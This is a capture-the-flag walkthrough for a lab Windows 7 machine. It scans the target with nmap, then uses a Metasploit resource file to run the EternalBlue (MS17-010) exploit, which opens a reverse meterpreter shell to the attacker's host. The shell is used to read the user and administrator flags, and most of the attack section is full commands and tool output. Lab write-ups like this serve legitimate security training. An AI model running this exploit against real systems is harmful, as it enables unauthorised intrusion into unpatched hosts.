# Connect to the machine 

use openvpn or another vpn to connect to the machine as follows 

```shell
openvpn lab_acountname.ovpn
```

after that try to ping the machine to make sure you are connected 


```shell
ping 10.10.10.40
```

if you get response then we are ready to enumerate


# Recon

 using Nmap with default scripts with default scripts and with services versions

```shell
nmap -sV -sC 10.10.10.40 -p- -A
```


which results to 

```shell

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-19 11:24 EDT
Nmap scan report for 10.10.10.40
Host is up (0.059s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open              Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49156/tcp open  msrpc       Microsoft Windows RPC
49157/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -19m58s, deviation: 34m37s, median: 0s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-19T16:25:45+01:00
| smb2-time: 
|   date: 2023-08-19T15:25:47
|_  start_date: 2023-08-19T15:22:39
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.95 seconds

```


to summery this result we have 4 ports open :

1. 135,49152,49153,49154,49155,49155,49156,49157 msrpc
2. 139 netbios-ssn
3. 445 microsoft-ds


OS : **Windows 7 Professional**


# Enumeration

## SMB
as we have an SMB share on the Windows host and it is one of the EOL systems , i am sure there is a public exploit and a CVE for it , doing simple search on the Internet landed us in the famous **Eternal Blue** exploit.

looking at the lind [rapid7_EternalBlue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) ,we can see that we can use Metasploit to attack the host.

lets this time do something different and create a Metasploit Resource file.

copy the follwing content to a file called eternalblue.rc , with the following content .
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.16.2
exploit
```

which will tell metasploit which exploit to use and the machine IP and our IP to retern the shell too

then firing metasploit 
```shell

msfconsole -r eternalblue.rc

->
                                                 
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.3.21-dev                          ]
+ -- --=[ 2327 exploits - 1215 auxiliary - 413 post       ]
+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View advanced module options with 
advanced
Metasploit Documentation: https://docs.metasploit.com/

[*] Processing eternalblue.rc for ERB directives.
resource (eternalblue.rc)> use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
resource (eternalblue.rc)> set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
resource (eternalblue.rc)> set LHOST 10.10.16.2
LHOST => 10.10.16.2
resource (eternalblue.rc)> exploit
[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.10.40
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.10.10.40:49158) at 2023-08-19 12:07:38 -0400

meterpreter >
```

and we successfully got a meterpreter shell :)

## Capturing the Flag

lets have a look at the files and find the `user.txt` file 

```shell

meterpreter > pwd
C:\Windows\system32
meterpreter > cd C:\\
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2017-07-21 02:56:27 -0400  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2022-02-18 10:11:31 -0500  Config.Msi
040777/rwxrwxrwx  0      dir   2009-07-14 01:08:56 -0400  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-13 23:20:08 -0400  PerfLogs
040555/r-xr-xr-x  4096   dir   2022-02-18 10:02:50 -0500  Program Files
040555/r-xr-xr-x  4096   dir   2017-07-14 12:58:41 -0400  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2017-12-23 21:23:01 -0500  ProgramData
040777/rwxrwxrwx  0      dir   2022-02-18 09:09:14 -0500  Recovery
040777/rwxrwxrwx  0      dir   2017-07-14 09:48:44 -0400  Share
040777/rwxrwxrwx  4096   dir   2022-02-18 10:02:22 -0500  System Volume Information
040555/r-xr-xr-x  4096   dir   2017-07-21 02:56:23 -0400  Users
040777/rwxrwxrwx  16384  dir   2022-02-18 10:32:41 -0500  Windows
000000/---------  0      fif   1969-12-31 19:00:00 -0500  pagefile.sys

meterpreter > cd Users\\
meterpreter > ls
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2017-07-21 02:56:36 -0400  Administrator
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:56 -0400  All Users
040555/r-xr-xr-x  8192  dir   2009-07-14 03:07:31 -0400  Default
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:56 -0400  Default User
040555/r-xr-xr-x  4096  dir   2011-04-12 03:51:29 -0400  Public
100666/rw-rw-rw-  174   fil   2009-07-14 00:54:24 -0400  desktop.ini
040777/rwxrwxrwx  8192  dir   2017-07-14 09:45:53 -0400  haris

meterpreter > cd haris\\
meterpreter > ls
Listing: C:\Users\haris
=======================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  AppData
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Application Data
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Contacts
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Cookies
040555/r-xr-xr-x  0       dir   2017-12-23 21:23:23 -0500  Desktop
040555/r-xr-xr-x  4096    dir   2017-07-15 03:58:33 -0400  Documents
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Downloads
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Favorites
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Links
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Local Settings
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Music
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  My Documents
100666/rw-rw-rw-  524288  fil   2021-01-15 04:41:00 -0500  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2017-07-14 10:03:15 -0400  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288  fil   2017-07-14 10:03:15 -0400  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2017-07-14 10:03:15 -0400  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  NetHood
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:32 -0400  Pictures
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  PrintHood
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Recent
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Saved Games
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Searches
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  SendTo
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Start Menu
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Templates
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:32 -0400  Videos
100666/rw-rw-rw-  262144  fil   2022-02-18 10:02:40 -0500  ntuser.dat.LOG1
100666/rw-rw-rw-  0       fil   2017-07-14 09:45:36 -0400  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2017-07-14 09:45:37 -0400  ntuser.ini

meterpreter > cat Desktop\\
[-] Desktop\ is a directory
meterpreter > cd Desktop\\
meterpreter > ls
Listing: C:\Users\haris\Desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-15 03:58:32 -0400  desktop.ini
100444/r--r--r--  34    fil   2023-08-19 12:06:47 -0400  user.txt

meterpreter > cat user.txt 
<Flag>
```

now lets see if we can access the Administrator Directory and get the flag

```shell
meterpreter > cd ../..
meterpreter > ls
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2017-07-21 02:56:36 -0400  Administrator
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:56 -0400  All Users
040555/r-xr-xr-x  8192  dir   2009-07-14 03:07:31 -0400  Default
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:56 -0400  Default User
040555/r-xr-xr-x  4096  dir   2011-04-12 03:51:29 -0400  Public
100666/rw-rw-rw-  174   fil   2009-07-14 00:54:24 -0400  desktop.ini
040777/rwxrwxrwx  8192  dir   2017-07-14 09:45:53 -0400  haris

meterpreter > cd Administrator\\
meterpreter > cd Desktop\\
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-21 02:56:40 -0400  desktop.ini
100444/r--r--r--  34    fil   2023-08-19 12:06:47 -0400  root.txt

meterpreter > cat root.txt 
<Flag>

```


# Lesson

- Finding EOL version of a machine indicates mostly that there is a CVE for it and usully a metasploit module.
- Try always to use new cool stuff to learn new cool things like the [Resource Scripts in Metasploit](https://docs.rapid7.com/metasploit/resource-scripts/) 